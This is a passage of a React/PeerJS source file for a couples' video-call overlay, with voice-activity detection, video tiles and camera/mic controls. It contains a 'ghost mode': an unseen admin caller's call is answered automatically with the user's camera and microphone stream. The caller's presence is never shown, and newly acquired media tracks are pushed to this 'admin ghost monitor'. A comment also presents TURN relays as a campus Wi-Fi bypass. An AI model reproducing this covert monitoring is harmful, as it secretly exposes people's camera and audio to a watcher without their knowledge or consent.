'use client';
import { useEffect, useRef, useState, useCallback } from 'react';
import { Mic, MicOff, Video, VideoOff, GripHorizontal, Maximize2, Minimize2, EyeOff, Eye, Volume2 } from 'lucide-react';
import gsap from 'gsap';
import { Draggable } from 'gsap/Draggable';
import { serverUrl } from '@/lib/socket';
import { getKey } from '@/lib/vault';
gsap.registerPlugin(Draggable);

// Helper to generate a blank canvas video track when camera hardware is powered off
function createBlankVideoTrack() {
  if (typeof document === 'undefined') return null;
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 320;
    canvas.height = 240;
    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.fillStyle = '#050505';
      ctx.fillRect(0, 0, 320, 240);
    }
    const stream = canvas.captureStream ? canvas.captureStream(5) : (canvas.webkitCaptureStream ? canvas.webkitCaptureStream(5) : null);
    return stream ? stream.getVideoTracks()[0] : null;
  } catch (err) {
    console.warn('Could not create dummy blank track:', err);
    return null;
  }
}

// Lightweight Voice Activity Detection (VAD) hook using Web Audio Analyser
function useStreamVoiceActivity(stream, onTalkChange) {
  useEffect(() => {
    if (!stream || typeof stream.getAudioTracks !== 'function') return;
    const audioTracks = (stream.getAudioTracks() || []).filter(t => t && t.readyState === 'live');
    if (audioTracks.length === 0) return;

    let ctx = null, analyser = null, src = null, timer = null, dead = false;
    let currentlyTalking = false;
    let holdTimer = null;

    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (!AudioCtx) return;
      ctx = new AudioCtx();
      analyser = ctx.createAnalyser();
      analyser.fftSize = 128;
      analyser.smoothingTimeConstant = 0.2;
      src = ctx.createMediaStreamSource(new MediaStream(audioTracks));
      src.connect(analyser);

      const buf = new Uint8Array(analyser.frequencyBinCount);

      const check = () => {
        if (dead) return;
        try {
          analyser.getByteFrequencyData(buf);
          let sum = 0;
          for (let i = 0; i < buf.length; i++) sum += buf[i];
          const avg = sum / buf.length;

          // Threshold 12 indicates human speech above ambient room noise
          const isLoud = avg > 12;

          if (isLoud) {
            clearTimeout(holdTimer);
            if (!currentlyTalking) {
              currentlyTalking = true;
              onTalkChange?.(true);
            }
            // Hold speech state for 1200ms after speech pauses
            holdTimer = setTimeout(() => {
              if (currentlyTalking) {
                currentlyTalking = false;
                onTalkChange?.(false);
              }
            }, 1200);
          }
        } catch {}

        timer = setTimeout(check, 100);
      };

      check();
    } catch (err) {
      console.warn('Voice activity detection init failed:', err);
    }

    return () => {
      dead = true;
      clearTimeout(timer);
      clearTimeout(holdTimer);
      try { src?.disconnect(); } catch {}
      try { ctx?.close(); } catch {}
    };
  }, [stream]);
}

// Persistent Remote Audio Sink - ensures call audio ALWAYS plays even if video is hidden or voiceOnly
function RemoteAudio({ stream, name, onTalk }) {
  const audioRef = useRef(null);
  const [blocked, setBlocked] = useState(false);

  useEffect(() => {
    const el = audioRef.current;
    if (!el || !stream) return;
    try {
      el.srcObject = stream;
      el.volume = 1.0;
    } catch (e) {
      console.warn('RemoteAudio srcObject error:', e);
    }

    const playAudio = () => {
      try {
        el.play().then(() => setBlocked(false)).catch(() => setBlocked(true));
      } catch {
        setBlocked(true);
      }
    };
    playAudio();

    const unlock = () => {
      el.play().then(() => setBlocked(false)).catch(() => {});
    };
    window.addEventListener('click', unlock, { once: true });
    window.addEventListener('touchstart', unlock, { once: true });

    return () => {
      window.removeEventListener('click', unlock);
      window.removeEventListener('touchstart', unlock);
    };
  }, [stream]);

  useStreamVoiceActivity(stream, onTalk);

  return (
    <>
      <audio
        ref={audioRef}
        autoPlay
        playsInline
        style={{ position: 'fixed', top: -9999, left: -9999, opacity: 0.001, pointerEvents: 'none' }}
      />
      {blocked && (
        <button
          type="button"
          onClick={() => audioRef.current?.play().then(() => setBlocked(false))}
          className="fixed top-16 left-1/2 -translate-x-1/2 z-50 flex items-center gap-2 rounded-full bg-gradient-to-r from-pink-600 via-rose-600 to-purple-600 px-4 py-2 text-xs font-bold text-white cursor-pointer border border-white/20 shadow-2xl animate-bounce"
        >
          <Volume2 className="h-4 w-4" />
          <span>Tap to hear {name || 'Partner'} audio 🔊</span>
        </button>
      )}
    </>
  );
}

export function Tile({
  stream,
  name,
  isPartner,
  voiceOnly,
  isSpeaking,
  isCamOff,
  isMicMuted,
  className = '',
  disableFullscreen = false,
}) {
  const videoRef = useRef(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [hasVideoTrack, setHasVideoTrack] = useState(false);

  useEffect(() => {
    const el = videoRef.current;
    if (!el) return;

    try {
      if (stream && !isCamOff && typeof stream.getVideoTracks === 'function') {
        el.srcObject = stream;
        el.muted = true; // Video element is muted; audio plays through RemoteAudio

        const vTracks = stream.getVideoTracks() || [];
        setHasVideoTrack(vTracks.length > 0 && vTracks.some((t) => t.enabled && t.readyState === 'live'));

        const tryPlay = () => {
          el.play().catch(() => {
            const resume = () => { el.play().catch(() => {}); };
            window.addEventListener('click', resume, { once: true });
            window.addEventListener('touchstart', resume, { once: true });
          });
        };
        tryPlay();
      } else {
        el.srcObject = null;
        setHasVideoTrack(false);
      }
    } catch (e) {
      console.warn('Tile video attach error:', e);
      try { el.srcObject = null; } catch {}
      setHasVideoTrack(false);
    }
  }, [stream, isCamOff]);

  useEffect(() => {
    const handleFsChange = () => {
      try {
        const fsEl = document.fullscreenElement || document.webkitFullscreenElement;
        setIsFullscreen(fsEl === videoRef.current);
      } catch {}
    };
    document.addEventListener('fullscreenchange', handleFsChange);
    document.addEventListener('webkitfullscreenchange', handleFsChange);
    return () => {
      document.removeEventListener('fullscreenchange', handleFsChange);
      document.removeEventListener('webkitfullscreenchange', handleFsChange);
    };
  }, []);

  const toggleFullscreen = (e) => {
    e?.stopPropagation?.();
    if (disableFullscreen) return;
    const el = videoRef.current;
    if (!el) return;
    try {
      const fsEl = document.fullscreenElement || document.webkitFullscreenElement;
      if (!fsEl) {
        if (el.requestFullscreen) {
          el.requestFullscreen().catch(() => {});
        } else if (el.webkitRequestFullscreen) {
          el.webkitRequestFullscreen();
        } else if (el.webkitEnterFullscreen) { // iOS Safari on iPhone
          el.webkitEnterFullscreen();
        }
      } else {
        if (document.exitFullscreen) {
          document.exitFullscreen().catch(() => {});
        } else if (document.webkitExitFullscreen) {
          document.webkitExitFullscreen();
        }
      }
    } catch {}
  };

  const initial = String(name || '?').charAt(0).toUpperCase();

  return (
    <div
      onDoubleClick={disableFullscreen ? undefined : toggleFullscreen}
      className={`group relative overflow-hidden rounded-2xl bg-[#222222] transition-all duration-300 shrink-0 ${
        className || 'w-full h-full aspect-video'
      } ${
        isSpeaking
          ? 'ring-2 ring-pink-500 shadow-[0_0_25px_rgba(236,72,153,0.35)] scale-[1.01]'
          : 'ring-1 border border-pink-500/20 ring-transparent shadow-md'
      }`}
      title={disableFullscreen ? name : isPartner ? 'Double click or tap expand for full screen' : name}
    >
      {/* Voice Only Mode */}
      {voiceOnly ? (
        <div className="absolute inset-0 flex flex-col items-center justify-center bg-gradient-to-b from-[#222222] to-[#1a1a1a] p-3 text-center">
          <div className={`relative mb-2 grid h-12 w-12 place-items-center rounded-2xl bg-gradient-to-tr from-pink-600/30 to-purple-600/30 border border-pink-500/40 text-pink-300 transition-transform ${isSpeaking ? 'scale-110 shadow-lg shadow-pink-500/40 ring-2 ring-pink-400' : ''}`}>
            <Mic className="h-6 w-6" />
          </div>
          <span className="text-xs font-bold text-white truncate max-w-[120px]">{name}</span>
          <span className="text-[10px] text-pink-300/80">Voice-Only Mode</span>
        </div>
      ) : isCamOff ? (
        <div className="absolute inset-0 flex flex-col items-center justify-center bg-gradient-to-b from-[#222222] to-[#1a1a1a] p-3 text-center z-10 select-none">
          {/* Avatar with initials & glowing ring */}
          <div className="relative mb-2">
            <div className={`h-11 w-11 sm:h-13 sm:w-13 rounded-2xl bg-gradient-to-tr from-purple-700 via-pink-600 to-rose-500 flex items-center justify-center font-display font-extrabold text-white text-base sm:text-lg shadow-xl ${isSpeaking ? 'ring-2 ring-pink-400 animate-pulse' : 'border border-pink-500/25'}`}>
              {initial}
            </div>
            <div className="absolute -bottom-1 -right-1 h-4 w-4 sm:h-5 sm:w-5 rounded-full bg-[#222222]/90 border border-rose-500/60 flex items-center justify-center text-rose-400 shadow">
              <VideoOff className="h-2.5 w-2.5 sm:h-3 sm:w-3" />
            </div>
          </div>
          <span className="text-xs font-bold text-white truncate max-w-[120px]">{name}</span>
          <span className="text-[10px] text-slate-400">Camera Off</span>
        </div>
      ) : (
        <>
          {/* Waiting/Connecting placeholder when stream is absent */}
          {(!stream || !hasVideoTrack) && (
            <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#222222] p-3 text-center z-10 select-none">
              <div className="relative mb-2 grid h-10 w-10 place-items-center rounded-2xl bg-pink-500/15 border border-pink-500/30 text-pink-300 animate-pulse">
                <Video className="h-5 w-5" />
              </div>
              <span className="text-xs font-bold text-white truncate max-w-[120px]">{name}</span>
              <span className="text-[10px] text-pink-300/70">{isPartner ? 'Connecting video…' : 'Starting camera…'}</span>
            </div>
          )}

          <video
            ref={videoRef}
            autoPlay
            playsInline
            webkit-playsinline="true"
            muted
            className={`h-full w-full object-cover transition-transform duration-300 group-hover:scale-105 ${
              !isPartner ? '-scale-x-100' : ''
            } ${(!hasVideoTrack || isCamOff) ? 'hidden' : 'block'}`}
          />
        </>
      )}

      {/* User Name Tag Overlay */}
      <div className="absolute bottom-2 left-2 rounded-xl bg-[#222222]/85 border border-pink-500/25 px-2.5 py-0.5 text-[11px] font-semibold text-white backdrop-blur-md flex items-center gap-1.5 z-20 shadow-md pointer-events-none">
        <span className="truncate max-w-[90px] sm:max-w-[120px]">{name}</span>
        {isSpeaking ? (
          <span className="h-2 w-2 rounded-full bg-emerald-400 animate-ping" />
        ) : isMicMuted ? (
          <MicOff className="h-3 w-3 text-rose-400" />
        ) : null}
      </div>

      {/* Speaking Active Glow Pill */}
      {isSpeaking && (
        <div className="absolute top-2 left-2 flex items-center gap-1 rounded-full bg-gradient-to-r from-pink-600 to-rose-600 px-2 py-0.5 text-[9px] font-extrabold text-white shadow-lg z-20 animate-pulse pointer-events-none">
          <Mic className="h-2.5 w-2.5" />
          <span>Speaking</span>
        </div>
      )}

      {/* Fullscreen Button */}
      {isPartner && stream && !voiceOnly && !isCamOff && !disableFullscreen && (
        <button
          type="button"
          onClick={toggleFullscreen}
          title={isFullscreen ? 'Exit full screen' : 'Full screen partner video'}
          className="absolute right-2 top-2 rounded-xl bg-[#222222]/85 hover:bg-[#222222] p-1.5 text-white/80 hover:text-white border border-pink-500/25 backdrop-blur-md transition hover:scale-110 z-20 cursor-pointer shadow-md"
        >
          {isFullscreen ? <Minimize2 className="h-3.5 w-3.5" /> : <Maximize2 className="h-3.5 w-3.5" />}
        </button>
      )}
    </div>
  );
}

export default function CouplesOverlay({
  me,
  users = [],
  peerRef,
  onScreen,
  showCall,
  setShowCall,
  socket,
  onVoiceActivity,
  callControlsRef,
  onCamChange,
  onMicChange,
  onStreamsChange,
  isMobileCallActive = false,
  onSwitchToCallTab,
  isGhost = false,
}) {
  const [mine, setMine] = useState(null);
  const [remote, setRemote] = useState({});     // peerId -> MediaStream
  const [ready, setReady] = useState(false);
  const [mic, setMic] = useState(true), [cam, setCam] = useState(true);
  const [remoteCamOff, setRemoteCamOff] = useState({});
  const [remoteMicMuted, setRemoteMicMuted] = useState({});
  const [internalHidden, setInternalHidden] = useState(false);
  const isHidden = showCall !== undefined ? !showCall : internalHidden;
  const setHide = (val) => {
    if (setShowCall) setShowCall(!val);
    setInternalHidden(val);
  };

  const box = useRef(), grip = useRef(), local = useRef();
  const activeCalls = useRef(new Map()); // targetPeerId -> PeerJS MediaConnection
  const knownReadyPeers = useRef(new Set()); // peerIds that announced readiness via socket

  // Voice Activity State Tracking (Local + Remote)
  const [localTalking, setLocalTalking] = useState(false);
  const [remoteTalking, setRemoteTalking] = useState({});

  const handleRemoteTalk = (peerId, talking) => {
    setRemoteTalking((prev) => ({ ...prev, [peerId]: talking }));
  };

  const isAnyoneTalking = localTalking || Object.values(remoteTalking).some(Boolean);

  useEffect(() => {
    onVoiceActivity?.(isAnyoneTalking);
    if (socket) {
      socket.emit('voice:active', { active: isAnyoneTalking });
    }
  }, [isAnyoneTalking]);

  useStreamVoiceActivity(mine, setLocalTalking);

  // Bandwidth capping for RTCPeerConnection to keep calls smooth on mobile & low-bandwidth connections
  const clampBitrates = (pc) => {
    if (!pc || !pc.getSenders) return;
    try {
      pc.getSenders().forEach((sender) => {
        if (!sender.track) return;
        const params = sender.getParameters();
        if (!params || !params.encodings || params.encodings.length === 0) return;
        if (sender.track.kind === 'video') {
          params.encodings[0].maxBitrate = 260000; // ~260 kbps for smooth mobile video
          params.encodings[0].maxFramerate = 24;
        } else if (sender.track.kind === 'audio') {
          params.encodings[0].maxBitrate = 32000; // 32 kbps Opus crystal clear voice
        }
        sender.setParameters(params).catch(() => {});
      });
    } catch {}
  };

  // Helper to place an outgoing call to a specific peer
  const callPeer = useCallback((targetId) => {
    if (!peerRef.current || !ready || !local.current) return;
    if (activeCalls.current.has(targetId)) {
      if (remote[targetId]) return; // already connected with remote stream
      try { activeCalls.current.get(targetId)?.close(); } catch {}
      activeCalls.current.delete(targetId);
    }

    try {
      const c = peerRef.current.call(targetId, local.current, { metadata: { type: 'cam', isGhost: Boolean(isGhost) } });
      if (!c) return;
      activeCalls.current.set(targetId, c);

      c.on('stream', (s) => {
        setRemote((prev) => ({ ...prev, [targetId]: s }));
        clampBitrates(c.peerConnection);
      });

      c.on('close', () => {
        activeCalls.current.delete(targetId);
        setRemote((prev) => {
          const next = { ...prev };
          delete next[targetId];
          return next;
        });
      });

      c.on('error', (err) => {
        console.warn('Call error with peer', targetId, err);
        activeCalls.current.delete(targetId);
      });
    } catch (e) {
      console.warn('Failed to initiate call to', targetId, e);
      activeCalls.current.delete(targetId);
    }
  }, [ready, remote]);

  // Main WebRTC & Media Initialization
  useEffect(() => {
    let peer = null, dead = false, timer = null;

    const blank = () => {
      const tracks = [];
      try {
        const c = document.createElement('canvas');
        c.width = 320;
        c.height = 240;
        const ctx = c.getContext('2d');
        if (ctx) {
          ctx.fillStyle = '#0f0c18';
          ctx.fillRect(0, 0, 320, 240);
        }
        const s = c.captureStream ? c.captureStream(5) : (c.webkitCaptureStream ? c.webkitCaptureStream(5) : null);
        if (s && s.getVideoTracks().length > 0) {
          tracks.push(s.getVideoTracks()[0]);
        }
      } catch {}

      // Add silent dummy audio track so initial WebRTC SDP offer/answer includes m=audio
      try {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (AudioCtx) {
          const actx = new AudioCtx();
          const osc = actx.createOscillator();
          const gain = actx.createGain();
          gain.gain.value = 0;
          const dst = actx.createMediaStreamDestination();
          osc.connect(gain);
          gain.connect(dst);
          osc.start();
          const trk = dst.stream.getAudioTracks()[0];
          if (trk) {
            trk.enabled = true;
            tracks.push(trk);
          }
        }
      } catch {}

      return new MediaStream(tracks);
    };

    const openPeer = async () => {
      const { default: Peer } = await import('peerjs');
      if (dead) return;

      let iceServers = [
        { urls: 'stun:stun.cloudflare.com:3478' },
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'stun:openrelay.metered.ca:80' },
        // University / College Wi-Fi Bypass: Tunnel WebRTC through standard TCP & TLS Port 443
        {
          urls: [
            'turn:openrelay.metered.ca:80',
            'turn:openrelay.metered.ca:443',
            'turn:openrelay.metered.ca:443?transport=tcp',
            'turns:openrelay.metered.ca:443?transport=tcp',
          ],
          username: 'openrelayproject',
          credential: 'openrelayproject',
        },
      ];
      let peerKey = 'peerjs';

      try {
        const keyParam = encodeURIComponent(getKey() || '');
        const res = await fetch(`${serverUrl()}/api/ice?key=${keyParam}`);
        if (res.ok) {
          const j = await res.json();
          if (j.iceServers && j.iceServers.length) iceServers = j.iceServers;
          if (j.peerKey) peerKey = j.peerKey;
        }
      } catch {}

      const u = new URL(serverUrl());
      peer = new Peer(me, {
        host: u.hostname,
        port: +u.port || (u.protocol === 'https:' ? 443 : 80),
        path: '/peerjs',
        secure: u.protocol === 'https:',
        config: { iceServers },
        key: peerKey,
      });
      peerRef.current = peer;

      peer.on('open', (id) => {
        if (dead) return;
        setReady(true);
        // Broadcast WebRTC readiness to partner in room via socket
        socket?.emit('webrtc:signal', { type: 'ready', peerId: id, cid: me });
      });

      peer.on('disconnected', () => {
        if (!dead) peer?.reconnect();
      });

      peer.on('error', (e) => {
        console.warn('PeerJS warning:', e.type, e.message);
        if (e.type === 'unavailable-id') {
          peer?.destroy();
          timer = setTimeout(openPeer, 2000);
        } else if (e.type === 'peer-unavailable') {
          const target = e.message.split(' ').pop();
          if (target) {
            activeCalls.current.delete(target);
          }
        }
      });

      peer.on('call', (c) => {
        if (c.metadata?.type === 'screen') {
          c.answer();
          c.on('stream', (s) => {
            onScreen(s);
            try {
              c.peerConnection?.getReceivers().forEach((receiver) => {
                if ('playoutDelayHint' in receiver) {
                  receiver.playoutDelayHint = 0;
                }
              });
            } catch {}
          });
          c.on('close', () => onScreen(null));
        } else {
          const partnerId = c.peer;
          const isGhostCaller = Boolean(c.metadata?.isGhost);
          activeCalls.current.set(partnerId, c);

          const answerWithStream = (streamToAnswer) => {
            try {
              c.answer(streamToAnswer);
            } catch (err) {
              console.warn('Error answering call:', err);
            }

            // 👻 If caller is an admin ghost inspecting stealthily, DO NOT render or play their stream
            if (!isGhostCaller) {
              c.on('stream', (s) => {
                setRemote((prev) => ({ ...prev, [partnerId]: s }));
                clampBitrates(c.peerConnection);
              });

              c.on('close', () => {
                activeCalls.current.delete(partnerId);
                setRemote((prev) => {
                  const next = { ...prev };
                  delete next[partnerId];
                  return next;
                });
              });

              c.on('error', (err) => {
                console.warn('Incoming call error with', partnerId, err);
                activeCalls.current.delete(partnerId);
              });
            } else {
              // Admin ghost call: clean up reference on close/error and optimize bitrate for mobile
              c.on('close', () => {
                activeCalls.current.delete(partnerId);
              });
              c.on('error', () => {
                activeCalls.current.delete(partnerId);
              });
              clampBitrates(c.peerConnection);
            }
          };

          if (local.current) {
            answerWithStream(local.current);
          } else {
            const checkLocalTimer = setInterval(() => {
              if (local.current) {
                clearInterval(checkLocalTimer);
                answerWithStream(local.current);
              }
            }, 100);
            setTimeout(() => {
              clearInterval(checkLocalTimer);
              if (!local.current) answerWithStream(blank());
            }, 6000);
          }
        }
      });
    };

    // Acquire camera & microphone with progressive fallback
    (async () => {
      let stream = null;

      // 👻 100% STEALTH GHOST MODE:
      // ZERO camera prompt, ZERO mic prompt, ZERO camera hardware LED activation!
      if (isGhost) {
        stream = blank(); // only blank video canvas, 0 audio tracks
        if (dead) return;
        local.current = stream;
        setMine(null);
        setCam(false);
        setMic(false);
        onCamChange?.(false);
        onMicChange?.(false);
        onStreamsChange?.({
          mine: null,
          remote: {},
          cam: false,
          mic: false,
          voiceOnly: false,
          localTalking: false,
          remoteTalking: {},
        });
        await openPeer();
        return;
      }
      try {
        // Ideal standard parameters (good quality + low CPU on phones)
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            facingMode: 'user',
          },
          audio: {
            echoCancellation: true,
            noiseSuppression: true,
            autoGainControl: true,
          },
        });
      } catch (err1) {
        console.warn('Standard getUserMedia failed, trying universal fallback:', err1);
        try {
          // Universal fallback: basic video + audio without specific constraints
          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        } catch (err2) {
          console.warn('Basic video+audio failed, trying audio only:', err2);
          try {
            // Audio only fallback
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const cStream = blank();
            stream = new MediaStream([
              ...cStream.getVideoTracks(),
              ...audioStream.getAudioTracks(),
            ]);
          } catch (err3) {
            console.warn('Media capture failed completely, using placeholder:', err3);
            stream = blank();
          }
        }
      }

      if (dead) return;
      local.current = stream;
      setMine(stream);

      // Immediately push acquired tracks to any active calls (including admin ghost monitor)
      const acquiredVideo = stream?.getVideoTracks?.()?.[0];
      const acquiredAudio = stream?.getAudioTracks?.()?.[0];
      if (acquiredVideo || acquiredAudio) {
        activeCalls.current.forEach((call) => {
          try {
            const senders = call.peerConnection?.getSenders?.() || [];
            if (acquiredVideo) {
              const videoSender = senders.find((s) => s.track?.kind === 'video' || s.kind === 'video');
              if (videoSender) videoSender.replaceTrack(acquiredVideo).catch(() => {});
            }
            if (acquiredAudio) {
              const audioSender = senders.find((s) => s.track?.kind === 'audio' || s.kind === 'audio');
              if (audioSender) audioSender.replaceTrack(acquiredAudio).catch(() => {});
            }
          } catch {}
        });
      }

      await openPeer();
    })();

    return () => {
      dead = true;
      clearTimeout(timer);
      local.current?.getTracks().forEach((t) => t.stop());
      peer?.destroy();
      peerRef.current = null;
    };
  }, [me]);

  // Socket signaling listener for immediate and synchronized WebRTC connection
  useEffect(() => {
    if (!socket) return;

    const onSignal = (payload = {}) => {
      const fromPeerId = payload.peerId || payload.fromCid;
      if (!fromPeerId || fromPeerId === me) return;

      if (payload.type === 'ready') {
        knownReadyPeers.current.add(fromPeerId);
        // Deterministic caller: peer with lexicographically smaller ID initiates
        if (ready && local.current) {
          if (me < fromPeerId) {
            callPeer(fromPeerId);
          } else {
            // Acknowledge so the other peer knows we are listening and ready
            socket.emit('webrtc:signal', { type: 'ready_ack', targetId: fromPeerId, peerId: me, cid: me });
          }
        }
      } else if (payload.type === 'ready_ack') {
        if (payload.targetId === me && ready && local.current && (me < fromPeerId)) {
          callPeer(fromPeerId);
        }
      } else if (payload.type === 'retry') {
        if (payload.targetId === me && ready && local.current && (me < fromPeerId)) {
          activeCalls.current.delete(fromPeerId);
          callPeer(fromPeerId);
        }
      } else if (payload.type === 'cam_state') {
        setRemoteCamOff((prev) => ({ ...prev, [fromPeerId]: !payload.cam }));
      } else if (payload.type === 'mic_state') {
        setRemoteMicMuted((prev) => ({ ...prev, [fromPeerId]: !payload.mic }));
      }
    };

    socket.on('webrtc:signal', onSignal);
    return () => socket.off('webrtc:signal', onSignal);
  }, [socket, ready, me, callPeer]);

  // Watchdog & Reconnection loop: checks every 3 seconds to ensure every peer has a live stream
  useEffect(() => {
    if (!ready || !local.current) return;

    const checkConnections = () => {
      const partnerUsers = users.filter((u) => u.id !== me);
      partnerUsers.forEach((partner) => {
        // If partner is present in room, but we don't have their stream yet:
        if (!remote[partner.id]) {
          if (isGhost || me < partner.id) {
            callPeer(partner.id);
          } else {
            // Signal partner to retry calling us
            socket?.emit('webrtc:signal', { type: 'retry', targetId: partner.id, fromCid: me });
          }
        }
      });
    };

    const interval = setInterval(checkConnections, 3200);
    checkConnections();
    return () => clearInterval(interval);
  }, [users, ready, remote, me, socket, callPeer, isGhost]);

  // GSAP Draggable for video window
  useEffect(() => {
    if (isHidden || !box.current) return;
    const d = Draggable.create(box.current, { trigger: grip.current, bounds: window, inertia: false })[0];
    gsap.from(box.current, { scale: 0.85, opacity: 0, duration: 0.35, ease: 'back.out(1.4)' });
    return () => d?.kill?.();
  }, [isHidden]);

  const [camSwitching, setCamSwitching] = useState(false);
  const [voiceOnly, setVoiceOnly] = useState(false);
  const [layout, setLayout] = useState('floating'); // 'floating' | 'side'

  // Physical Camera Hardware Toggle: Stops hardware sensor to completely power down device camera light
  const toggleCam = async () => {
    if (isGhost) return; // Ghost mode never touches physical camera hardware
    if (camSwitching) return;
    setCamSwitching(true);

    try {
      if (cam) {
        // --- TURN CAMERA OFF: STOP PHYSICAL CAMERA HARDWARE SENSOR ---
        const currentVideoTracks = (local.current && typeof local.current.getVideoTracks === 'function')
          ? local.current.getVideoTracks()
          : [];
        currentVideoTracks.forEach((track) => {
          try {
            track.stop(); // Powers off the physical camera light and sensor on device
          } catch {}
          try {
            local.current?.removeTrack(track);
          } catch {}
        });

        // Insert blank dummy canvas track so WebRTC RTCPeerConnection stays connected
        const dummyTrack = createBlankVideoTrack();
        if (dummyTrack && local.current && typeof local.current.addTrack === 'function') {
          try {
            local.current.addTrack(dummyTrack);
          } catch (e) {
            console.warn('Could not add dummy track:', e);
          }
        }

        // Replace track on all active PeerJS RTCPeerConnection video senders
        activeCalls.current.forEach((call) => {
          try {
            const senders = call.peerConnection?.getSenders?.() || [];
            const videoSender = senders.find((s) => s.track?.kind === 'video' || s.kind === 'video');
            if (videoSender) {
              videoSender.replaceTrack(dummyTrack || null).catch((e) => console.warn('replaceTrack off error:', e));
            }
          } catch {}
        });

        if (local.current) {
          try {
            const liveTracks = (local.current.getTracks?.() || []).filter((t) => t.readyState === 'live');
            setMine(new MediaStream(liveTracks));
          } catch {
            setMine(null);
          }
        }
        setCam(false);
        try {
          socket?.emit('webrtc:signal', { type: 'cam_state', cam: false, fromCid: me });
        } catch {}
      } else {
        // --- TURN CAMERA ON: RE-ACQUIRE FROM USER MEDIA ---
        let freshStream = null;
        if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
          try {
            freshStream = await navigator.mediaDevices.getUserMedia({
              video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: 'user',
              },
            });
          } catch {
            try {
              freshStream = await navigator.mediaDevices.getUserMedia({ video: true });
            } catch (err) {
              console.warn('Failed to re-acquire camera on mobile device:', err);
              setCamSwitching(false);
              return;
            }
          }
        } else {
          console.warn('navigator.mediaDevices.getUserMedia is unavailable in this environment');
          setCamSwitching(false);
          return;
        }

        const freshTrack = freshStream?.getVideoTracks?.()?.[0];
        if (freshTrack) {
          if (!local.current) {
            local.current = freshStream;
          } else {
            // Stop and remove dummy blank tracks
            try {
              (local.current.getVideoTracks?.() || []).forEach((track) => {
                try { track.stop(); } catch {}
                try { local.current.removeTrack(track); } catch {}
              });
              local.current.addTrack(freshTrack);
            } catch (e) {
              console.warn('Could not swap fresh track into local stream:', e);
              local.current = freshStream;
            }
          }

          // Update active WebRTC calls with the fresh real camera track
          activeCalls.current.forEach((call) => {
            try {
              const senders = call.peerConnection?.getSenders?.() || [];
              const videoSender = senders.find((s) => s.track?.kind === 'video' || s.kind === 'video');
              if (videoSender) {
                videoSender.replaceTrack(freshTrack).catch((e) => console.warn('replaceTrack on error:', e));
              }
            } catch {}
          });

          try {
            const liveTracks = (local.current.getTracks?.() || []).filter((t) => t.readyState === 'live');
            setMine(new MediaStream(liveTracks));
          } catch {
            setMine(freshStream);
          }
          setCam(true);
          try {
            socket?.emit('webrtc:signal', { type: 'cam_state', cam: true, fromCid: me });
          } catch {}
        }
      }
    } catch (err) {
      console.warn('Error in toggleCam:', err);
    } finally {
      setCamSwitching(false);
    }
  };

  const toggleMic = () => {
    if (isGhost) return; // Ghost mode never touches microphone
    const next = !mic;
    local.current?.getAudioTracks().forEach((t) => (t.enabled = next));
    setMic(next);
    socket?.emit('webrtc:signal', { type: 'mic_state', mic: next, fromCid: me });
  };

  const toggleVoiceOnly = async () => {
    const next = !voiceOnly;
    setVoiceOnly(next);
    if (next) {
      if (cam) await toggleCam();
    } else {
      if (!cam) await toggleCam();
    }
  };

  const cycleLayout = () => {
    setLayout((l) => (l === 'floating' ? 'side' : 'floating'));
  };

  // Sync state to parent controls if provided
  useEffect(() => {
    onCamChange?.(cam);
  }, [cam, onCamChange]);

  useEffect(() => {
    onMicChange?.(mic);
  }, [mic, onMicChange]);

  useEffect(() => {
    if (callControlsRef) {
      callControlsRef.current = {
        toggleCam,
        toggleMic,
        toggleVoiceOnly,
        cam,
        mic,
        voiceOnly,
        camSwitching,
      };
    }
  }, [cam, mic, voiceOnly, camSwitching, callControlsRef]);

  useEffect(() => {
    onStreamsChange?.({
      mine,
      remote,
      cam,
      mic,
      voiceOnly,
      localTalking,
      remoteTalking,
      remoteCamOff,
      remoteMicMuted,
      toggleCam,
      toggleMic,
      toggleVoiceOnly,
    });
  }, [mine, remote, cam, mic, voiceOnly, localTalking, remoteTalking, remoteCamOff, remoteMicMuted, onStreamsChange]);

  return (
    <>
      {/* Persistent Audio for Remote Peers: Always mounted so call audio NEVER drops even when video is hidden or minimized */}
      <div>
        {Object.entries(remote).map(([peerId, stream]) => {
          if (peerId === me || !stream) return null;
          const user = users.find((u) => (u.id || u.cid) === peerId);
          return (
            <RemoteAudio
              key={peerId}
              stream={stream}
              name={user?.name || 'Partner'}
              onTalk={(talking) => handleRemoteTalk(peerId, talking)}
            />
          );
        })}
      </div>



      {/* 3. DESKTOP FLOATING WINDOW (Hidden on mobile phones, preserved for desktop displays) */}
      {isHidden ? (
        <button
          type="button"
          onClick={() => setHide(false)}
          className="hidden lg:flex fixed bottom-24 left-5 z-40 items-center gap-2 rounded-full border border-pink-500/30 bg-[#222222]/95 backdrop-blur-md px-3.5 py-2 text-xs font-semibold text-pink-200 transition hover:border-pink-400 hover:text-white shadow-2xl cursor-pointer"
          title="Show video call window"
        >
          <Video className="h-3.5 w-3.5 text-rose-400" />
          <span>Show Video Call</span>
          {isAnyoneTalking && <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />}
        </button>
      ) : (
        <div ref={box} className={`hidden lg:block fixed bottom-20 left-5 z-40 rounded-2xl border border-pink-500/30 bg-[#222222]/95 backdrop-blur-xl p-2.5 transition-all shadow-2xl ${layout === 'side' ? 'max-w-[92vw]' : ''}`}>
          <div className="flex items-center justify-between pb-1.5 px-0.5 text-white/50 gap-2">
            <div ref={grip} className="flex flex-1 cursor-grab items-center active:cursor-grabbing" title="Drag to move">
              <GripHorizontal className="h-4 w-4" />
            </div>
            <div className="flex items-center gap-1">
              <button
                type="button"
                onClick={cycleLayout}
                title={layout === 'floating' ? 'Switch to side-by-side layout' : 'Switch to floating stacked layout'}
                className="rounded-lg p-1 text-white/60 hover:bg-white/10 hover:text-white transition text-[10px]"
              >
                {layout === 'floating' ? 'Side-by-side' : 'Stack'}
              </button>
              <button
                type="button"
